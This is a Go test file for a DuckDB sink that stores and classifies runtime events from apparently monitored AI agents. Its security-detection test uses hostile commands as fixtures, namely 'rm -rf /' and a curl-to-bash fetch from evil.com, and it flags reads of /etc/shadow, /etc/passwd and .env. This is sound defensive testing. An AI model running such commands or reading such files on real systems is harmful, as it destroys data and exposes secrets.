package sink

import (
	"context"
	"database/sql"
	"encoding/json"
	"path/filepath"
	"testing"
	"time"

	runtimeevent "github.com/haolipeng/LLM-Scope/internal/runtime/event"
)

func openTestDB(t *testing.T) *DuckDBSink {
	t.Helper()
	dbPath := filepath.Join(t.TempDir(), "test.duckdb")
	sink, err := NewDuckDBSink(DuckDBConfig{
		DBPath:        dbPath,
		BatchSize:     10,
		FlushInterval: 100 * time.Millisecond,
		SessionID:     "test-session",
	})
	if err != nil {
		t.Fatalf("NewDuckDBSink: %v", err)
	}
	return sink
}

func TestDuckDBSink_CreateSchema(t *testing.T) {
	sink := openTestDB(t)
	defer sink.Close()

	// Verify table exists.
	var count int
	err := sink.DB().QueryRow("SELECT COUNT(*) FROM events").Scan(&count)
	if err != nil {
		t.Fatalf("query events table: %v", err)
	}
	if count != 0 {
		t.Errorf("expected 0 rows, got %d", count)
	}

	// Verify views exist.
	views := []string{
		"v_session_overview",
		"v_tool_call_stats",
		"v_process_lifecycle",
		"v_security_alerts",
		"v_resource_timeseries",
		"v_network_analysis",
		"v_hot_files",
		"v_exfiltration_risk",
	}
	for _, v := range views {
		_, err := sink.DB().Query("SELECT * FROM " + v + " LIMIT 0")
		if err != nil {
			t.Errorf("view %s not accessible: %v", v, err)
		}
	}
}

func TestDuckDBSink_InsertProcessEvent(t *testing.T) {
	sink := openTestDB(t)
	defer sink.Close()

	data := map[string]interface{}{
		"event":        "EXEC",
		"pid":          float64(1234),
		"ppid":         float64(1),
		"comm":         "test",
		"filename":     "/usr/bin/test",
		"full_command":  "test --flag",
		"timestamp":    float64(12345678),
	}
	dataJSON, _ := json.Marshal(data)

	event := &runtimeevent.Event{
		TimestampNs:     12345678,
		TimestampUnixMs: 1700000000000,
		Source:          "process",
		PID:             1234,
		Comm:            "test",
		Data:            dataJSON,
	}

	sink.addEvent(event)
	sink.flush()

	var count int
	sink.DB().QueryRow("SELECT COUNT(*) FROM events WHERE source = 'process'").Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 process event, got %d", count)
	}

	var eventType, filename sql.NullString
	var ppid sql.NullInt64
	sink.DB().QueryRow("SELECT event_type, filename, ppid FROM events WHERE source = 'process'").
		Scan(&eventType, &filename, &ppid)

	if !eventType.Valid || eventType.String != "EXEC" {
		t.Errorf("expected event_type=EXEC, got %v", eventType)
	}
	if !filename.Valid || filename.String != "/usr/bin/test" {
		t.Errorf("expected filename=/usr/bin/test, got %v", filename)
	}
}

func TestDuckDBSink_InsertToolCallEvent(t *testing.T) {
	sink := openTestDB(t)
	defer sink.Close()

	data := map[string]interface{}{
		"event_type": "tool_call_end",
		"tool_name":  "fs.read",
		"status":     "success",
		"reason":     "completed",
		"bytes":      float64(1024),
		"key_field":  "/etc/passwd",
		"duration_ms": float64(42),
		"args_hash":  "abc123",
		"tid":        float64(5),
	}
	dataJSON, _ := json.Marshal(data)

	event := &runtimeevent.Event{
		TimestampNs:     99999,
		TimestampUnixMs: 1700000001000,
		Source:          "tool_call",
		PID:             5678,
		Comm:            "node",
		Data:            dataJSON,
	}

	sink.addEvent(event)
	sink.flush()

	var toolName, toolStatus sql.NullString
	var sensitive bool
	sink.DB().QueryRow(`
		SELECT tool_name, tool_status, is_sensitive_file
		FROM events WHERE source = 'tool_call'
	`).Scan(&toolName, &toolStatus, &sensitive)

	if !toolName.Valid || toolName.String != "fs.read" {
		t.Errorf("expected tool_name=fs.read, got %v", toolName)
	}
	if !toolStatus.Valid || toolStatus.String != "success" {
		t.Errorf("expected tool_status=success, got %v", toolStatus)
	}
	if !sensitive {
		t.Error("expected is_sensitive_file=true for /etc/passwd")
	}
}

func TestDuckDBSink_InsertSystemEvent(t *testing.T) {
	sink := openTestDB(t)
	defer sink.Close()

	data := map[string]interface{}{
		"type":  "system_metrics",
		"alert": false,
		"cpu":   map[string]interface{}{"percent": "12.5", "cores": float64(4)},
		"memory": map[string]interface{}{"rss_kb": float64(25552), "vsz_kb": float64(1151800)},
		"process": map[string]interface{}{"threads": float64(11), "children": float64(2)},
	}
	dataJSON, _ := json.Marshal(data)

	event := &runtimeevent.Event{
		TimestampNs:     88888,
		TimestampUnixMs: 1700000002000,
		Source:          "system",
		PID:             9999,
		Comm:            "node",
		Data:            dataJSON,
	}

	sink.addEvent(event)
	sink.flush()

	var cpuPercent sql.NullFloat64
	var memRss sql.NullInt64
	var threads sql.NullInt64
	sink.DB().QueryRow(`
		SELECT cpu_percent, mem_rss_kb, thread_count
		FROM events WHERE source = 'system'
	`).Scan(&cpuPercent, &memRss, &threads)

	if !cpuPercent.Valid || cpuPercent.Float64 != 12.5 {
		t.Errorf("expected cpu_percent=12.5, got %v", cpuPercent)
	}
	if !memRss.Valid || memRss.Int64 != 25552 {
		t.Errorf("expected mem_rss_kb=25552, got %v", memRss)
	}
	if !threads.Valid || threads.Int64 != 11 {
		t.Errorf("expected thread_count=11, got %v", threads)
	}
}

func TestDuckDBSink_Consume(t *testing.T) {
	dbPath := filepath.Join(t.TempDir(), "consume.duckdb")
	sink, err := NewDuckDBSink(DuckDBConfig{
		DBPath:        dbPath,
		BatchSize:     10,
		FlushInterval: 100 * time.Millisecond,
		SessionID:     "consume-test",
	})
	if err != nil {
		t.Fatalf("NewDuckDBSink: %v", err)
	}
	// don't defer Close(), Consume handles cleanup

	ch := make(chan *runtimeevent.Event, 5)
	for i := 0; i < 3; i++ {
		data, _ := json.Marshal(map[string]interface{}{
			"event":    "EXEC",
			"pid":      float64(100 + i),
			"ppid":     float64(1),
			"filename": "/bin/test",
		})
		ch <- &runtimeevent.Event{
			TimestampNs:     int64(i * 1000),
			TimestampUnixMs: 1700000000000 + int64(i),
			Source:          "process",
			PID:             uint32(100 + i),
			Comm:            "test",
			Data:            data,
		}
	}
	close(ch)

	ctx := context.Background()
	sink.Consume(ctx, ch)

	// After Consume returns, the DB file should contain the data.
	// Re-open to verify.
	db, err := sql.Open("duckdb", dbPath)
	if err != nil {
		t.Fatalf("reopen db: %v", err)
	}
	defer db.Close()

	var count int
	if err := db.QueryRow("SELECT COUNT(*) FROM events").Scan(&count); err != nil {
		t.Fatalf("count query: %v", err)
	}
	if count != 3 {
		t.Errorf("expected 3 rows after Consume, got %d", count)
	}
}

func TestDuckDBSink_SecurityDetection(t *testing.T) {
	sink := openTestDB(t)
	defer sink.Close()

	tests := []struct {
		name       string
		source     string
		data       map[string]interface{}
		sensitive  bool
		dangerous  bool
	}{
		{
			name:   "sensitive file /etc/shadow",
			source: "process",
			data: map[string]interface{}{
				"event":    "FILE_OPEN",
				"filepath": "/etc/shadow",
				"flags":    float64(0),
			},
			sensitive: true,
		},
		{
			name:   "sensitive .env file",
			source: "process",
			data: map[string]interface{}{
				"event":    "FILE_OPEN",
				"filepath": "/app/.env",
				"flags":    float64(0),
			},
			sensitive: true,
		},
		{
			name:   "dangerous rm -rf command",
			source: "process",
			data: map[string]interface{}{
				"event":        "EXEC",
				"full_command":  "rm -rf /",
				"filename":     "/bin/rm",
			},
			dangerous: true,
		},
		{
			name:   "dangerous curl pipe bash",
			source: "process",
			data: map[string]interface{}{
				"event":        "EXEC",
				"full_command":  "curl http://evil.com/script.sh | bash",
				"filename":     "/usr/bin/curl",
			},
			dangerous: true,
		},
		{
			name:   "normal file access",
			source: "process",
			data: map[string]interface{}{
				"event":    "FILE_OPEN",
				"filepath": "/home/user/code.go",
				"flags":    float64(0),
			},
			sensitive: false,
			dangerous: false,
		},
	}

	for i, tt := range tests {
		dataJSON, _ := json.Marshal(tt.data)
		event := &runtimeevent.Event{
			TimestampNs:     int64(i * 1000),
			TimestampUnixMs: 1700000000000 + int64(i),
			Source:          tt.source,
			PID:             uint32(1000 + i),
			Comm:            "test",
			Data:            dataJSON,
		}
		sink.addEvent(event)
	}
	sink.flush()

	rows, err := sink.DB().Query(`
		SELECT comm, is_sensitive_file, is_dangerous_cmd
		FROM events ORDER BY id
	`)
	if err != nil {
		t.Fatalf("query: %v", err)
	}
	defer rows.Close()

	i := 0
	for rows.Next() {
		var comm string
		var sensitive, dangerous bool
		if err := rows.Scan(&comm, &sensitive, &dangerous); err != nil {
			t.Fatalf("scan row %d: %v", i, err)
		}
		tt := tests[i]
		if sensitive != tt.sensitive {
			t.Errorf("[%s] is_sensitive_file: got %v, want %v", tt.name, sensitive, tt.sensitive)
		}
		if dangerous != tt.dangerous {
			t.Errorf("[%s] is_dangerous_cmd: got %v, want %v", tt.name, dangerous, tt.dangerous)
		}
		i++
	}
}

func TestDuckDBSink_ViewToolCallStats(t *testing.T) {
	sink := openTestDB(t)
	defer sink.Close()

	// Insert tool_call_start + tool_call_end pairs.
	for i := 0; i < 10; i++ {
		start, _ := json.Marshal(map[string]interface{}{
			"event_type": "tool_call_start",
			"tool_name":  "fs.read",
		})
		end, _ := json.Marshal(map[string]interface{}{
			"event_type":  "tool_call_end",
			"tool_name":   "fs.read",
			"status":      "success",
			"duration_ms": float64(i * 10),
			"bytes":       float64(100),
		})
		sink.addEvent(&runtimeevent.Event{
			TimestampNs:     int64(i * 1000),
			TimestampUnixMs: 1700000000000 + int64(i*2),
			Source:          "tool_call",
			PID:             100,
			Comm:            "node",
			Data:            start,
		})
		sink.addEvent(&runtimeevent.Event{
			TimestampNs:     int64(i*1000 + 500),
			TimestampUnixMs: 1700000000000 + int64(i*2+1),
			Source:          "tool_call",
			PID:             100,
			Comm:            "node",
			Data:            end,
		})
	}
	sink.flush()

	var callCount, successCount int
	var p50 sql.NullFloat64
	err := sink.DB().QueryRow(`
		SELECT call_count, success_count, p50_ms
		FROM v_tool_call_stats
		WHERE tool_name = 'fs.read'
	`).Scan(&callCount, &successCount, &p50)
	if err != nil {
		t.Fatalf("query v_tool_call_stats: %v", err)
	}

	if callCount != 10 {
		t.Errorf("expected call_count=10, got %d", callCount)
	}
	if successCount != 10 {
		t.Errorf("expected success_count=10, got %d", successCount)
	}
	if !p50.Valid {
		t.Error("expected valid p50_ms")
	}
}

func TestDuckDBSink_BatchFlush(t *testing.T) {
	dbPath := filepath.Join(t.TempDir(), "batch.duckdb")
	sink, err := NewDuckDBSink(DuckDBConfig{
		DBPath:        dbPath,
		BatchSize:     5,
		FlushInterval: 10 * time.Second, // very long, won't trigger
		SessionID:     "batch-test",
	})
	if err != nil {
		t.Fatalf("NewDuckDBSink: %v", err)
	}
	defer sink.Close()

	// Insert exactly BatchSize events to trigger auto-flush.
	for i := 0; i < 5; i++ {
		data, _ := json.Marshal(map[string]interface{}{"event": "EXEC"})
		sink.addEvent(&runtimeevent.Event{
			TimestampNs:     int64(i),
			TimestampUnixMs: 1700000000000,
			Source:          "process",
			PID:             uint32(i),
			Comm:            "test",
			Data:            data,
		})
	}

	// Give the flush goroutine time to complete.
	time.Sleep(100 * time.Millisecond)

	var count int
	sink.DB().QueryRow("SELECT COUNT(*) FROM events").Scan(&count)
	if count != 5 {
		t.Errorf("expected 5 rows after batch flush, got %d", count)
	}
}
